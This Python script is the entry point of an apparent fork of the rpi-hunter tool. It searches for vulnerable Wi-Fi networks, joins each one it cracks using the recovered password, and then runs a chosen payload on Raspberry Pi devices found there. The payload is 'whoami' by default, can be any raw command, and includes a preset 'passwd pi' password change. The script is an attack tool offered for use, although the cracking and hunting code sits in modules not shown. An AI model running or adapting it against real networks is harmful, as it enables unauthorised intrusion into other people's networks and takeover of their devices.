import argparse
from rpi.hunter import let_the_hunt_begin
from network_buster.buster import bust, connect_to_network
from termcolor import colored
import platform

parser = argparse.ArgumentParser()
parser.add_argument('--list', action='store_true',
					help='List available payloads')
parser.add_argument('--payload', type=str, default='whoami',
					help='(Name of, or raw) payload [ex. password or \'whoami\']')

args = parser.parse_args()

list_mode = args.list

payloads = {
	'password': '"passwd pi"'
}

# List available payloads.
def list_payloads():
	print("Available preset payloads:")
	print(f"Specify with {colored('--payload name', 'green')}")
	for key, value in payloads.items():
		print(f"{colored(f'[{key}]', 'yellow')} {colored(value, 'white')}")
	print('\n')

# Prints the introduction message, originally inserted BusesCanFly.
# Kept (but updated) for the their sake!
def intro():
	print("\n")
	print(colored('                       NETWORK-BUSTER \'n\' RPI-HUNTER                       ', 'red'))
	print(colored('-----------------------------------------------------------------------------', 'yellow'))
	print('            Originally by BusesCanFly, Forked & Modified by Team             ')
	print(colored('-----------------------------------------------------------------------------', 'yellow'))
	print("\n")

intro()

if (list_mode):
	list_payloads()
	exit()
else:
	print("Searching for vulnerable networks...")
	successful_networks = bust()

	if successful_networks:
		if args.payload in payloads:
			payload = payloads[args.payload]
		else:
			payload = args.payload

		for network in successful_networks:
			print(f"Beginning the hunt on {network['network']}...")
			connect_to_network(network['network'], network['password'], platform.system())
			let_the_hunt_begin(payload)
			print("")
	exit()
